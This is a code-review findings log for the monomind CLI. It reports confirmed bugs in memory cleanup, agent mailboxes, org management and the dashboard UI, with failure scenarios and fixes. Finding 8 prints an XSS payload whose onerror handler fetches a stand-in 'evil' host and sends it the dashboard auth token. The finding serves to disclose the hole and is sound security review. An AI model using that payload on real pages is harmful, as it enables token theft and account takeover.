# Swarm Review Findings — 2026-07-18 session modules

49 agents, 42 raw findings, 33 confirmed after adversarial verification, 9 refuted.
Status legend: [ ] open · [x] fixed in-session.

## 1. [CRITICAL] cleanup --data --force deletes every LIVE project's active memory database (lancedb/ is not dead — it contains the current engine's memory.db)

- **File:** packages/@monomind/cli/src/commands/cleanup.ts:88  (cleanup-doctor)
- **Status:** [x] fixed in-session (2026-07-18)

findOrphanedProjectData assumes `<slug>/lancedb/` is a leftover from the pre-2.3.1 LanceDB engine and flags it as prunable for every dir whose origin.json points at an existing project. But the replacement SQLite engine still writes its database INSIDE that directory: memory-bridge.ts:69 sets the default dir to `path.join(projectDataDir(), 'lancedb')` and memory-bridge.ts:166 sets `databasePath: path.join(dir, 'memory.db')`. So `~/.monomind/projects/<slug>/lancedb/memory.db` is the live store for every project that has used memory since the 2026-07 engine swap. The pruner verifies a project is alive via origin.json, then schedules deletion of exactly that project's active data. The test (cleanup-scratch.test.ts:125) only creates an empty `lancedb/` fixture dir, so it encodes the wrong assumption instead of catching it.

**Failure:** User runs `monomind memory store` in any project (bridge writes ~/.monomind/projects/<slug>/lancedb/memory.db and origin.json), then later runs `monomind cleanup --data --force`. Line 86 sees origin path exists -> line 87-88 pushes `<slug>/lancedb` as 'dead lancedb store' -> line 329 rmSync recursive deletes the live memory.db of every healthy project on the machine. Even the dry run tells the user this deletion is safe.

**Suggested fix:** Only flag `<slug>/lancedb` when it actually contains LanceDB artifacts and no live SQLite file — e.g. prune only if `!existsSync(join(lance, 'memory.db'))` (or if the dir contains `*.lance`/dataset manifests). Better: have the bridge migrate memory.db out of the `lancedb`-named dir first, then the 'dead lancedb' rule becomes safe.

**Verifier:** Confirmed end-to-end. memory-bridge.ts:69 sets the current SQLite engine's dir to projectDataDir()/lancedb and :166 puts the live DB at <slug>/lancedb/memory.db (the 2026-07 engine swap kept the 'lancedb' directory name — comment at :151-155 says so explicitly), while :162-163 writes origin.json on every init. cleanup.ts:86-88 then flags <slug>/lancedb as a 'dead lancedb store' precisely when origin.json proves the project is alive, with no memory.db/mtime/content check, and cleanup.ts:329 rmSync-recursively deletes it under --data --force; the default dry run (line 327) mislabels the same del

---

## 2. [HIGH] Messages delivered during a session restart window are silently swallowed by the abandoned previous mailbox stream generator

- **File:** packages/@monomind/cli/src/orgrt/session.ts:66  (orgrt-runtime)
- **Status:** [x] fixed in-session (2026-07-18)

Mailbox has a single `wake` slot (mailbox.ts:43). While a session is idle, the SDK's prompt reader holds an outstanding next() on the stream generator, which is suspended at `await new Promise(r => this.wake = r)`. When that session ends (maxTurns reached — runAgentSession's while(true) restart at session.ts:66-71 — or crashes into daemon.ts's supervised backoff loop, daemon.ts:132-158), the old generator stays suspended with `wake` still pointing at its resolver. runOneSession is invoked again with a fresh `mailbox.stream()`, but the new generator only registers its own waiter after the new SDK session calls next() and finds the queue empty. Any `mailbox.push()` in that window (new-session subprocess startup takes seconds; crash backoff is 1s/5s/15s) resolves the OLD resolver: the old generator resumes, `queue.shift()`s the message, and yields it into the dead session's abandoned next() promise. The message is dequeued and never reaches the new session.

**Failure:** Agent A's session hits maxTurns and restarts (or crashes and enters a 5s backoff). During the restart/backoff window the boss org_sends A a task; deliver() returns 'delivered to A' and the bus logs the message. The stale generator consumes it into the dead SDK session. A's new session starts with an empty queue and waits forever; A never acts, the boss believes the task is in flight, and the run stalls until the scheduler timeout.

**Suggested fix:** Make Mailbox support this safely: keep a list of waiters or, better, have stream() re-check a generation token — simplest fix is to make the yield transactional (peek the head, yield, then shift only after the yield returns, so a value yielded into an abandoned next() is not lost), and/or null out `wake` plus terminate the old generator (track the active generator and have stale ones return immediately on resume) before starting a replacement session.

**Verifier:** Confirmed by end-to-end repro using the exact Mailbox source. Mailbox (mailbox.ts:16,43) has a single `wake` slot; while a session is idle the SDK's streaming-input pump holds a pending next(), leaving the generator parked at `await new Promise(r => this.wake = r)`. The same Mailbox instance persists across restarts (daemon.ts:105, sessionOpts daemon.ts:109-123) for both the maxTurns restart loop (session.ts:66-70, fresh mailbox.stream() at session.ts:129) and the 1s/5s/15s crash-backoff loop (daemon.ts:131-158), and nothing resets `wake` between sessions. A push() during the restart/backoff w

---

## 3. [HIGH] deliver() returns a false 'delivered' receipt for terminally-crashed agents — crash path never closes the mailbox

- **File:** packages/@monomind/cli/src/orgrt/daemon.ts:233  (orgrt-runtime)
- **Status:** [x] fixed in-session (2026-07-18)

The supervised restart loop's terminal `crash()` (daemon.ts:140-150) sets `runtime.status = 'crashed'` and emits an audit event, but does not close the agent's mailbox. deliver() only checks `targetAgent.mailbox.isClosed` (daemon.ts:233) and never consults `runtime.status`, so after an agent exhausts its retry budget, messages to it are pushed into a queue that no session will ever read, and the sender receives 'delivered to <role>'. Same gap in receiveRemote() (daemon.ts:304).

**Failure:** A specialist agent crashes 4 times (retry budget exhausted) and is terminal. The coordinator then org_sends it a task; the tool result says 'delivered to developer'. The coordinator waits indefinitely for a reply that can never come — the run silently makes no progress until the org is stopped externally, and the coordinator records a misleading outcome.

**Suggested fix:** Call `mailbox.close()` inside `crash()` (closing after the session has permanently exited is safe — nothing will drain it), or have deliver()/receiveRemote() also check `targetAgent.status === 'crashed'` and return the same undeliverable error used for closed mailboxes.

**Verifier:** Confirmed on current code. The terminal crash() (daemon.ts:140-149) sets runtime.status='crashed' but never calls mailbox.close(); the only mailbox.close() call sites in the runtime are session.ts:161 (budget exhausted) and daemon.ts:404 (stopOrg). deliver() gates delivery solely on targetAgent.mailbox.isClosed (daemon.ts:233) and never consults runtime.status, and the crashed agent is never removed from running.agents, so after retry-budget exhaustion (attempt >= BACKOFFS_MS.length at daemon.ts:150) messages are pushed into an in-memory queue with no consumer — runAgentSession's promise has s

---

## 4. [HIGH] stopOrg racing autoWake-restart of the same org destroys the new run's forwarder and overwrites runtime.json to 'stopped'

- **File:** packages/@monomind/cli/src/orgrt/daemon.ts:439  (orgrt-runtime)
- **Status:** [x] fixed in-session (2026-07-18)

stopOrg deletes the org from `this.orgs` at line 401 but only removes its forwarder (439-440) and writes runtime.json (441) at the end — after an up-to-15s agent wait, bus flush, history/memory writes, and forwarder.settle(). startOrg is fully synchronous (no awaits), so during that window a cross-org message, queued inbox drain, or answerQuestion can trigger autoWake() → startOrg(name), which does `this.forwarders.set(name, newForwarder)` (line 98) and persists 'running' (178). The still-running old stopOrg then does `this.forwarders.get(name)` — fetching the NEW org's forwarder — awaits its settle, unsubscribes it, and deletes it from the map; finally it writes `{status:'stopped', run: oldRun}` over the new run's runtime.json. The old run's forwarder is orphaned (never settled/unsubscribed — its final org:complete can be killed at process exit, the exact bug the settle await was added to prevent).

**Failure:** A scheduled org in `org serve` is being stopped (stopOrg in-flight, ~15s window). Another org sends it a message: deliver() misses `this.orgs`, queues it, autoWake starts a new run. The old stopOrg then unsubscribes and deletes the NEW run's forwarder — the dashboard receives no events for the new run and its eventual stopOrg finds no forwarder, so the run shows 'running' forever. runtime.json says status:'stopped' while the org is actually running, so `isOrgRunning`/`org status`/`org stop` all misreport.

**Suggested fix:** Capture the org's own forwarder reference in RunningOrg (or key forwarders by run id, not org name) and remove it from the map at the same time as `this.orgs.delete(name)`; likewise pass the run id into persistState and skip the write if runtime.json's run no longer matches. Alternatively, block autoWake for a name while a stopOrg for it is still in flight (a `stopping` Set).

**Verifier:** Verified end-to-end on current code. stopOrg (daemon.ts:394) deletes the org from this.orgs at line 401, then enters a long await window (15s agent race at 411, bus.flush at 419, history + storeRunMemory with embedding writes at 423-434) before removing the forwarder (439-440) and persisting 'stopped' (441). In that window autoWake(name) is reachable via deliver() (223-227, cross-org send from another org on the same serve daemon), receiveRemote() (294-298, POST /api/xdeliver), or answerQuestion() (371-381); its guard at 387 passes because this.orgs no longer has the name. startOrg's body (73-

---

## 5. [HIGH] Artifact-suffix substring matching hides real orgs and lets `org delete` destroy a sibling org's config

- **File:** packages/@monomind/cli/src/commands/org.ts:41  (org-cli)
- **Status:** [x] fixed in-session (2026-07-18)

listOrgConfigFiles filters with `f.includes(suf)` over ORG_ARTIFACT_SUFFIXES. ORG_NAME_RE permits hyphens, so a legitimately-created org named e.g. `team-skills`, `release-plugins`, or `my-state-machine` (contains '-skills'/'-plugins'/'-state') is silently excluded from `org list`, `org status` (all-orgs), `org validate` (all-orgs), `org serve` scheduling, and the 'available:' hint in `org run`. Worse, deleteAction (lines 326-331) unlinks `${orgName}${suf}${ext}` for every suffix: deleting org `team` also unlinks `team-skills.json` — which is the config of a different org if one named `team-skills` exists.

**Failure:** `monomind org create team-skills --template content-team` succeeds and `monomind org run team-skills` works, but `monomind org list` says it doesn't exist and `org serve` never schedules it. Then `monomind org delete team --yes` (a different org) permanently deletes team-skills.json with no warning — the surviving org's runtime subdir is orphaned and the org is gone.

**Suggested fix:** Match artifacts exactly against known org stems (f === `${stem}${suf}.json`), or at minimum use endsWith and have deleteAction only remove artifact files whose stem isn't itself a registered org config. Alternatively reject org names ending in an artifact suffix at create/validate time.

**Verifier:** Verified end-to-end in packages/@monomind/cli/src/commands/org.ts. ORG_NAME_RE (line 16) permits hyphens and createAction (org-observe.ts:242) has no artifact-suffix guard, so `org create team-skills` writes a valid team-skills.json and `org run team-skills` works (existsSync check at line 63 bypasses the filter). But listOrgConfigFiles (lines 38-42) excludes any file whose name merely *includes* one of the 21 ORG_ARTIFACT_SUFFIXES, so team-skills is invisible to `org list` (line 269), `org status` all-orgs (lines 158-160), `org serve` scheduling (line 226 — a scheduled org is silently never r

---

## 6. [HIGH] Dedup gate searches across all namespaces, silently dropping stores into other namespaces

- **File:** packages/@monomind/cli/src/memory/memory-bridge.ts:284  (memory-engine)
- **Status:** [x] fixed in-session (2026-07-18)

The pre-store dedup gate calls backend.search(embedding, { k:1, threshold }) with no filters, so it matches entries in any namespace. If similar content exists anywhere (identical content scores 1.0 >= default 0.85), bridgeStoreEntry returns {success:true, duplicate:true, id:<other-namespace entry>} and never writes the requested entry. It also ignores the key, so re-storing an updated-but-similar value under the same key (without upsert) is silently swallowed instead of stored.

**Failure:** bridgeStoreEntry({key:'jwt', value:'JWT with refresh tokens', namespace:'patterns'}) succeeds; then bridgeStoreEntry({key:'auth-note', value:'JWT with refresh tokens', namespace:'solutions'}) returns duplicate:true. A subsequent memory search/list --namespace solutions finds nothing — the entry was never persisted, and the caller was told success:true.

**Suggested fix:** Scope the dedup search to the target namespace (filters:{namespace}) and skip dedup when the candidate's key differs — or at minimum verify similar[0].entry.namespace === namespace before short-circuiting.

**Verifier:** Confirmed end-to-end. memory-bridge.ts:284 calls backend.search(embedding, {k:1, threshold}) with no filters, while both backends only scope by namespace when filters.namespace is set: SQLiteBackend.search omits the WHERE clause entirely (sqlite-backend.ts:483-489) and SqlJsBackend.search passes the undefined namespace into query(), which skips the AND namespace=? predicate (sqljs-backend.ts:533-537, 402-405). So identical content stored earlier in 'patterns' scores 1.0 (deterministic embedding) >= default 0.85, and bridgeStoreEntry returns {success:true, duplicate:true, id:<patterns entry>} a

---

## 7. [HIGH] Ingest marks document as indexed even when zero chunks were stored — permanent silent search miss

- **File:** packages/@monomind/cli/src/knowledge/document-pipeline.ts:268  (knowledge-pipeline)
- **Status:** [x] fixed in-session (2026-07-18)

appendMetadata() runs unconditionally after the store loop, recording the content hash and chunkCount: chunks.length regardless of `indexed`. If the memory bridge fails to load (getBridge() returns null, e.g. LanceDB native module missing/unbuilt — a designed-for failure mode given the try/catch at lines 183-190), or every bridgeStoreEntry call throws or returns success:false, indexed stays 0 but metadata is still written with the current hash. On every subsequent ingest, the `existing.contentHash === hash` check at line 233 short-circuits with skipped:true and even reports chunksIndexed: existing.chunkCount (the full chunk count that was never actually stored). The document becomes permanently unsearchable with no retry path short of editing the file or deleting doc-metadata.jsonl.

**Failure:** First `knowledge ingest` runs while @lancedb native bindings are unbuilt → bridge import throws → 0 chunks stored, metadata written with hash. User fixes LanceDB and re-runs ingest → skipped:true, 'chunksIndexed: N' reported → searchKnowledge never returns anything for this doc, forever.

**Suggested fix:** Only appendMetadata when indexed > 0 (or when bridge was available and indexed === chunks.length); record `chunkCount: indexed`; consider returning an error in the result when bridge is null so ingestDirectory surfaces it in `errors` instead of counting the file as processed.

**Verifier:** Confirmed end-to-end. appendMetadata at packages/@monomind/cli/src/knowledge/document-pipeline.ts:268-275 runs unconditionally after the store loop, writing contentHash and chunkCount=chunks.length even when indexed=0. The reviewer's exact trigger is slightly stale — memory-bridge.ts no longer eagerly loads LanceDB (replaced with SQLite 2026-07), so getBridge() returning null is unlikely — but the equivalent path is real: getBackend() (memory-bridge.ts:123-206) returns null when @monoes/memory fails to import/init, making bridgeStoreEntry return null (memory-bridge.ts:230); and any backend.sto

---

## 8. [HIGH] XSS in run-history rendering: totalTokens and crashes.length interpolated into innerHTML without esc()

- **File:** packages/@monomind/cli/src/ui/orgs.html:1785  (server-ui)
- **Status:** [x] fixed in-session (2026-07-18)

loadRunHistory() builds el.innerHTML from history.jsonl records. Line 1785 interpolates `${h.totalTokens || 0}` and line 1790 interpolates `${h.crashes.length}` with no esc(), while every neighboring field (h.run, outcome.status, outcome.summary) is escaped. history.jsonl lines are arbitrary JSON.parse'd objects (server.mjs:5904-5906 accepts any parseable line), and the GET /api/orgs/:name/history route reads the file from any `?dir=` the page passes — so the rendered content is file-controlled, not schema-controlled. The orgs page carries the dashboard auth token in a <meta name="mm-token"> tag (server.mjs:5771), so injected script can read it and gain full authenticated API access (routes that write files, stop/start orgs, etc.).

**Failure:** User opens the orgs dashboard on a project (e.g. a cloned repo) whose .monomind/orgs/<name>/history.jsonl contains a line like {"run":"r1","totalTokens":"<img src=x onerror=fetch('//evil/'+document.querySelector('meta[name=mm-token]').content)>"} (or "crashes":{"length":"<img ...>"}). loadRunHistory() renders it via innerHTML, the onerror fires in the dashboard origin, and the auth token is exfiltrated — full authenticated control of the local server API.

**Suggested fix:** Wrap both interpolations: `${esc(String(h.totalTokens || 0))}` and `${esc(String(h.crashes.length))}`, or coerce with Number() and render only finite numbers (matching the Math.round(h.durationMs/1000) pattern already used for durationMs).

**Verifier:** Could not refute — the scenario reproduces end-to-end on current code. orgs.html:1785 interpolates `${h.totalTokens || 0}` and :1790 `${h.crashes.length}` directly into el.innerHTML (assigned line 1779) with no esc() and no numeric coercion, while every neighboring field (h.run 1784, outcome.status 1787, outcome.summary 1788) IS escaped. The data is file-controlled: server.mjs:5904-5906 JSON.parses arbitrary history.jsonl lines with zero schema validation and the GET /api/orgs/:name/history route (server.mjs:5896) reads from an unrestricted ?dir= path, so a malicious cloned project can plant .

---

## 9. [HIGH] 'Origin gone' prune treats a temporarily-unavailable path as a deleted project (unmounted volumes, network shares, EACCES)

- **File:** packages/@monomind/cli/src/commands/cleanup.ts:86  (cleanup-doctor)
- **Status:** [x] fixed in-session (2026-07-18)

A dir with origin.json is classified 'orphaned project data' and recursively deleted whenever `existsSync(originPath)` is false. existsSync returns false not only when the project was deleted, but also when the path is on an unmounted external/network volume, when any ancestor is unreadable (EACCES), or when a symlinked path segment recorded at write time was since re-pointed while the real project still exists. This repo itself lives on `/Volumes/media` — a removable mount — so its own memory data is one unplugged disk away from being classified orphaned. Absence-of-path is not proof of project deletion, yet it triggers unconditional recursive rmSync under --force.

**Failure:** Project lives at /Volumes/media/projects/foo; user ejects the disk (or the SMB share drops) and runs `monomind cleanup --data --force` from another project. existsSync('/Volumes/media/projects/foo') -> false -> line 91-92 marks the dir orphaned -> line 329 deletes all of the project's accumulated memory/embeddings. Remounting the disk later restores the project but its memory store is gone.

**Suggested fix:** Distinguish 'parent volume/mount absent' from 'project dir absent': if the nearest existing ancestor is the filesystem root or a /Volumes-style mount root that is itself missing, skip with a note instead of pruning. Alternatively require the origin path's parent directory to exist before declaring orphanhood, and/or only prune origin-gone dirs after they have also been unmodified for the 30-day window.

**Verifier:** Claim reproduces end-to-end on current code. memory-bridge.ts:163 records path.resolve(process.cwd()) (e.g. /Volumes/media/projects/foo) in origin.json, while the data dir itself lives under homedir() (~/.monomind/projects, cleanup.ts:316) — so when the project's volume is unmounted or an ancestor is unreadable, origin.json still parses but existsSync(originPath) at cleanup.ts:86 returns false (empirically verified: false for both a nonexistent /Volumes mount point and an EACCES ancestor; existsSync never throws). The dir is then pushed as 'orphaned' at cleanup.ts:91-92 with no age grace (the 

---

## 10. [HIGH] 30-day staleness gate reads the slug dir's own mtime, which writes to lancedb/memory.db never update — actively-used pre-2.3.1 dirs get pruned

- **File:** packages/@monomind/cli/src/commands/cleanup.ts:93  (cleanup-doctor)
- **Status:** [x] fixed in-session (2026-07-18)

For dirs without origin.json, the non-aggressive path prunes when `now - mtime > 30d`, where mtime is `lstatSync(dir).mtimeMs` of the top-level slug dir (line 75-77). POSIX directory mtime only changes when a direct child entry is created/renamed/removed. All actual data writes go to `<slug>/lancedb/memory.db` (a grandchild), so the slug dir's mtime is frozen at creation time. origin.json is only ever written during memory-bridge init on CLI >=2.3.1 (memory-bridge.ts:162), so any project whose memory is accessed exclusively by an older pinned CLI, or by a tool that opens the db without going through getBackend, accrues daily writes while the classifier sees an 'untouched >30d' unmarked dir. The docstring's safety claim ('every live project rewrites origin.json on its next memory access') only holds for >=2.3.1 access within the window.

**Failure:** Team member pins monomind 2.2.x in project A (its bridge writes to ~/.monomind/projects/<slugA>/lancedb/memory.db daily but never creates origin.json). 31 days after the dir was first created, someone with the new CLI runs `monomind cleanup --data --force` -> line 93 sees no marker and stale top-dir mtime -> project A's actively-written memory store is deleted.

**Suggested fix:** Base staleness on the newest mtime found in a shallow recursive scan of the dir (or at least max of the dir, lancedb/, and lancedb/memory.db mtimes), not on the top-level dir entry alone.

**Verifier:** Verified end-to-end. cleanup.ts:93 gates unmarked dirs on lstatSync(slugDir).mtimeMs (lines 75-77), but all data writes go to <slug>/lancedb/memory.db — a grandchild (memory-bridge.ts:69,166). Empirically confirmed on APFS: appending to lancedb/memory.db updates lancedb/'s mtime but leaves the top slug dir's mtime frozen at creation; mkdirSync recursive no-ops don't refresh it either. Git history confirms the exposure window: the ~/.monomind/projects/<slug>/lancedb layout shipped in v1.18.1 (199e0512, 2026-07-05) while origin.json was only added in 03930e0e (v2.3.2, 2026-07-18), so every publi

---

## 11. [MEDIUM] Boss selection ('type === boss' OR reports_to null, with roles[0] fallback) diverges from org_complete gating (reports_to == null only)

- **File:** packages/@monomind/cli/src/orgrt/daemon.ts:163  (orgrt-runtime)
- **Status:** [ ] open

startOrg picks the kickoff recipient as `def.roles.find(r => r.type === 'boss' || r.reports_to === null) ?? def.roles[0]` and its briefing instructs it to 'record it with org_complete'. But session.ts registers the org_complete tool only when `role.reports_to == null` (session.ts:78, 92), and buildRolePrompt's coordinator instructions use the same check. RoleSchema allows a role with type 'boss' and a non-null reports_to, and allows org defs where no role has reports_to null (the roles[0] fallback then picks an arbitrary subordinate).

**Failure:** A user-authored org def has the boss role as `{ type: 'boss', reports_to: 'advisory-board' }` (or all roles report to someone, triggering the roles[0] fallback). The kickoff message tells that agent to call org_complete, but the tool was never registered for it — every attempt fails as an unknown tool. The run's outcome is never recorded: history.jsonl shows 'no recorded outcome' forever, cross-run memory stores 'Outcome: not recorded', and the next run's briefing says the previous run achieved nothing.

**Suggested fix:** Use one predicate for both sides — e.g. export an `isCoordinator(role, def)` helper matching startOrg's boss selection, and gate org_complete/the coordinator prompt on it; or validate at startOrg that the chosen boss has reports_to === null and warn/normalize otherwise.

**Verifier:** Confirmed end-to-end. daemon.ts:163 picks the kickoff recipient with `r.type === 'boss' || r.reports_to === null` (fallback roles[0]), while session.ts:78/92 registers org_complete only when `role.reports_to == null` — and RoleSchema (types.ts:28-29) leaves `type` and `reports_to` fully independent, so `{type:'boss', reports_to:'advisory-board'}` parses fine. `org run` (org.ts:95 → daemon.ts:76) enforces nothing beyond OrgDefSchema.parse; the single-root invariant lives only in the optional `org validate` subcommand (org-observe.ts:47-49), and the boss-with-non-null-reports_to variant passes e

---

## 12. [MEDIUM] Many failure paths return success:false without logging — dispatcher exits 1 with zero output

- **File:** packages/@monomind/cli/src/commands/org.ts:19  (org-cli)
- **Status:** [ ] open

index.ts:261-262 executes `if (result && !result.success) process.exit(result.exitCode || 1)` and never prints result.message — org.ts:522-527 documents this exact trap for the bare `org` action. Yet many of the new subcommand paths return a failure message without calling log(): validateOrgName's missing-name branch (org.ts:19), runAction's missing-name (org.ts:50) and repeated --task (org.ts:60), logsAction's 'no runs found' (org-observe.ts:80), reportAction's 'no run history' / 'no runs found' / 'no recorded events' (org-observe.ts:112, 122, 124), answerAction's usage and 'already answered' (org-observe.ts:193, 200), and validateAction's 'no orgs directory' / 'no org configs found' (org-observe.ts:27, 29).

**Failure:** `monomind org logs growth` when growth has never run, or `monomind org answer growth q-1 "yes"` when q-1 is already answered, or `monomind org report growth --all` with no history: the command prints nothing at all and exits 1. The user gets zero indication of what went wrong (the helpful hint text like 'start one with: monomind org run growth' is composed but discarded).

**Suggested fix:** Either log(output.error(message)) before every failing return in these actions (matching the pattern already used at org.ts:65, 141, etc.), or fix the dispatcher to print result.message on failure.

**Verifier:** Confirmed by live reproduction, not just code reading. The dispatcher at packages/@monomind/cli/src/index.ts:261-262 executes `if (result && !result.success) process.exit(result.exitCode || 1)` and never prints result.message (no other code path does either — org.ts:522-527's own comment documents this exact trap). All cited branches return {success:false, message} without logging: org.ts:19 (validateOrgName missing name), org.ts:50, org.ts:60, org-observe.ts:80, 112, 122, 124, 193, 200, 27, 29. Ran the actual CLI (bin/cli.js, dist matches source) in a fresh project: `org logs growth` (never r

---

## 13. [MEDIUM] org answer offline fallback rewrites questions.json from a stale pre-fetch snapshot, losing concurrent daemon writes

- **File:** packages/@monomind/cli/src/commands/org-observe.ts:224  (org-cli)
- **Status:** [ ] open

answerAction reads questions.json once (line 194), then may spend up to 10s on the live-delivery fetch (line 207-211). When the org IS running but live delivery is rejected or times out (broker entry stale, daemon busy), it falls through to the offline path, which rewrites the entire questions.json from the pre-fetch `questions` array (lines 224-229). Any question the running daemon appended during that window is deleted from the file, and any answer the daemon recorded meanwhile is reverted to unanswered. The atomic tmp+rename only prevents torn writes, not this lost-update race; two concurrent `org answer` invocations for different questions likewise last-write-win, so the losing one's answer is erased from the file even though its inbox message was queued — leaving it listed as pending and answerable a second time (duplicate delivery next run).

**Failure:** Org running; agent asks q-2 while a user runs `org answer growth q-1 "yes"` and the daemon's HTTP endpoint times out. Fallback writes the snapshot that predates q-2: q-2 vanishes from questions.json, `org questions growth` never shows it, and the agent blocks on ask_human forever. Alternatively the daemon had just answered q-1 live: the file now shows the CLI's answer, and a second queued `answer:q-1` message is delivered on the next run.

**Suggested fix:** Re-read questions.json immediately before the offline write (and re-check q.answer !== null then), merge by questionId instead of replacing the whole array, and skip the fallback write when the org is confirmed running (queue-only, or fail with instructions).

**Verifier:** Confirmed lost-update race. answerAction snapshots questions.json at org-observe.ts:194, then may spend up to 10s on the live fetch; the offline fallback (org-observe.ts:224-229) rewrites the entire file from that stale snapshot. The fallback provably runs while the daemon is alive: every ok:false from /api/answer-question (server.ts:51-53) comes from a live daemon (daemon.ts:351,352,365,366 — question-not-found, already-answered, role-not-found, mailbox-closed), and the 10s timeout can fire against a live daemon since lookupOrg (broker.ts:41-49) accepts any heartbeat under 90s. The daemon wri

---

## 14. [MEDIUM] Upsert delete-then-store window destroys the existing entry when store() throws

- **File:** packages/@monomind/cli/src/memory/memory-bridge.ts:273  (memory-engine)
- **Status:** [x] fixed in-session (2026-07-18)

bridgeStoreEntry with upsert:true deletes the existing entry (lines 271-278) and only afterwards calls backend.store(entry) (line 291). The delete is its own committed autocommit transaction; store() can then throw and the function returns {success:false} — but the old entry is already gone. A guaranteed throw path exists: the bridge tag filter (line 239) only checks type/length, while SQLiteBackend.validateTags (sqlite-backend.ts:729-737) rejects any tag not matching /^[a-zA-Z0-9_\-.:]+$/ (spaces, slashes, unicode). bridgeRecordCausalEdge (line 813, upsert:true) puts the caller-supplied relation string directly into tags. A process kill between delete and store loses the entry the same way.

**Failure:** bridgeRecordCausalEdge({sourceId:'a', targetId:'b', relation:'depends_on'}) succeeds; later bridgeRecordCausalEdge({sourceId:'a', targetId:'b', relation:'depends on'}) runs: getByKey finds the edge, delete(existing.id) commits, then SQLiteBackend.store throws Invalid tag format on 'depends on'. Result: previous edge permanently deleted, new one never written, caller just sees success:false.

**Suggested fix:** Validate/sanitize tags in the bridge to the backend's TAG_RE before the delete, and reorder to store-new-then-delete-old (or perform delete+store inside one better-sqlite3 transaction / reuse INSERT OR REPLACE keyed on namespace+key).

**Verifier:** Confirmed end-to-end on current code. bridgeStoreEntry (memory-bridge.ts:271-278) deletes the existing entry before store; SQLiteBackend.delete (sqlite-backend.ts:331-346) runs autocommitted statements outside any transaction, so the delete is durable immediately. backend.store then calls validateTags first (sqlite-backend.ts:189, 729-737), which throws on any tag not matching /^[a-zA-Z0-9_\-.:]+$/ — and the bridge's own tag filter (memory-bridge.ts:238-240) only checks type/length, letting spaced/unicode tags through. bridgeRecordCausalEdge (memory-bridge.ts:813-826, upsert:true) puts the cal

---

## 15. [MEDIUM] Keyword fallback collapses 'all namespaces' searches to the 'default' namespace only

- **File:** packages/@monomind/cli/src/memory/memory-bridge.ts:358  (memory-engine)
- **Status:** [x] fixed in-session (2026-07-18)

When no namespace filter is given (namespace undefined, i.e. CLI 'all' sentinel per line 326), the semantic path correctly searches every namespace, but the keyword fallback queries backend.query({namespace: namespace ?? 'default'}) — restricting to the literal 'default' namespace. Whenever the embedder is unavailable (model download failed, offline — exactly the environments the sql.js fallback targets, see line 148) or semantic search yields zero results above threshold, cross-namespace search silently returns only 'default'-namespace hits. bridgeContextSynthesize and bridgeHierarchicalRecall (no tier) inherit this.

**Failure:** Embedding model fails to load (searchMethod='keyword'). Entries exist in namespace 'patterns'. `monomind memory search --query 'auth pattern'` (namespace 'all') returns nothing, while `--namespace patterns` finds them — inconsistent and looks like data loss.

**Suggested fix:** Pass namespace (possibly undefined = no filter) straight through: query({ namespace, limit: 50000 }).

**Verifier:** Confirmed end-to-end. CLI search without --namespace sends the 'all' sentinel (commands/memory-crud.ts:282); memory-read.ts:59 delegates to bridgeSearchEntries whenever the backend loads (backend init at memory-bridge.ts:179-195 succeeds even when the embedder fails at 147-149, so the bridge path is taken in exactly the degraded environments claimed); memory-bridge.ts:326 maps 'all' to undefined. The semantic path (line 338) correctly passes no filter when namespace is undefined, but the keyword fallback (line 358) passes namespace ?? 'default', and both SQLiteBackend.query (sqlite-backend.ts:

---

## 16. [MEDIUM] UNIQUE(namespace,key) exists only in the sql.js schema — better-sqlite3 accumulates duplicate keys and retrieve returns a stale row

- **File:** packages/@monomind/memory/src/sqlite-backend.ts:772  (memory-engine)
- **Status:** [ ] open

sqljs-backend.ts:232-234 creates UNIQUE idx_namespace_key so INSERT OR REPLACE upserts by (namespace,key); sqlite-backend.ts:772 creates the same index non-UNIQUE, and its INSERT OR REPLACE conflicts only on the id primary key. bridgeStoreEntry always generates a fresh id (line 243/267), so on the better-sqlite3 path storing the same key twice without upsert creates two rows. getByKey (sqlite-backend.ts:288-292) has no ORDER BY and returns an arbitrary (in practice first-inserted, i.e. stale) row. The dedup gate does not protect the common failure mode: it is skipped entirely when the embedder is unavailable, and misses genuinely different values for the same key below 0.85 similarity.

**Failure:** No embedder loaded. `memory store --key deploy-host --value host-A`, later `memory store --key deploy-host --value host-B`. Two rows now share (default, deploy-host); `memory retrieve --key deploy-host` returns host-A forever, and `memory delete --key deploy-host` deletes only one of the two rows.

**Suggested fix:** Add the UNIQUE index (with a migration deduplicating existing rows, keep max(updated_at)) so both backends share upsert-by-key semantics, or make getByKey ORDER BY updated_at DESC as a stopgap.

**Verifier:** Verified end-to-end. sqljs-backend.ts:232-234 creates UNIQUE idx_namespace_key so its INSERT OR REPLACE upserts by (namespace,key); sqlite-backend.ts:772 creates the same index NON-unique and store() (lines 139-145, 201) conflicts only on the id PK. bridgeStoreEntry (memory-bridge.ts:243) mints a fresh crypto-random id per call; its upsert pre-delete (270-278) is gated on options.upsert, which the CLI 'memory store' command defaults to false (commands/memory-crud.ts:56,118); the dedup gate (282-289) requires a loaded embedder and is skipped when the HF model fails to load (147-149 tolerate thi

---

## 17. [MEDIUM] SQLiteBackend.search returns expired (TTL'd) entries — sql.js backend does not

- **File:** packages/@monomind/memory/src/sqlite-backend.ts:484  (memory-engine)
- **Status:** [ ] open

The brute-force search SQL (lines 484-489) joins memory_entries to memory_embeddings with only an optional namespace predicate — no `expires_at IS NULL OR expires_at > now` filter, unlike query() (lines 420-423). SqlJsBackend.search goes through query() and does exclude expired rows. So on the primary backend, entries stored with a TTL keep surfacing in semantic search (and in the dedup gate) after expiry.

**Failure:** bridgeStoreEntry({key:'k', value:'v', ttl:60}) then, an hour later, `memory search --query v` returns the expired entry; worse, the dedup gate (memory-bridge.ts:284) matches the expired ghost and refuses to store a fresh replacement (duplicate:true), while retrieve/list (query-based paths) show nothing — the data appears unrecoverable.

**Suggested fix:** Add `AND (e.expires_at IS NULL OR e.expires_at > ?)` to the search SQL.

**Verifier:** Confirmed on current code. SQLiteBackend.search (sqlite-backend.ts:484-489) joins memory_entries to memory_embeddings with only an optional namespace predicate — no expires_at filter and no post-filter in the scoring loop — while query() (lines 420-423) excludes expired rows, and SqlJsBackend.search (sqljs-backend.ts:533) delegates to query() so it does exclude them. The bridge prefers SQLiteBackend (memory-bridge.ts:182), TTL is wired end-to-end (memory-crud.ts:68 → bridgeStoreEntry → expiresAt at memory-bridge.ts:264), and no expiry sweep exists in either SQLite backend (the only TTL deletio

---

## 18. [MEDIUM] Stale-entry filter hides knowledge:* results in all-namespace searches

- **File:** packages/@monomind/cli/src/memory/memory-bridge.ts:391  (memory-engine)
